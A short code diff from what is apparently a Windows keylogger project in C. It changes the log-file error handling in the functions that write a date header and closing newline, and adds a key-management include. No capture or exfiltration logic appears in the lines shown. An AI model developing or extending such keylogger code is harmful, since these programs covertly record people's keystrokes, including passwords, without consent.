@@ -4,14 +4,14 @@
 #include <windows.h>
 #include "win_keylog.h"
 #include "../writing/file.h"
+#include "key_management.h"
 
 // Whenever the keylogger is started, add this to the file first
 void winWriteHeader(const char* filePath) {
     FILE *file;
     file = fopen(filePath, "a");
-    if (file == NULL) {
-        return;
-    }
+    if (file == NULL)
+        exit(EXIT_FAILURE);
 
     // Write the date and time into the file
     SYSTEMTIME st;
@@ -76,9 +76,9 @@ void end_keylog(const char* filePath) {
         // Add a new line to the file
         FILE *file;
         file = fopen(filePath, "a");
-        if (file == NULL) {
-            return;
-        }
+        if (file == NULL)
+            exit(EXIT_FAILURE);
+
         fputs("\n", file);
         fflush(file);
         fclose(file);
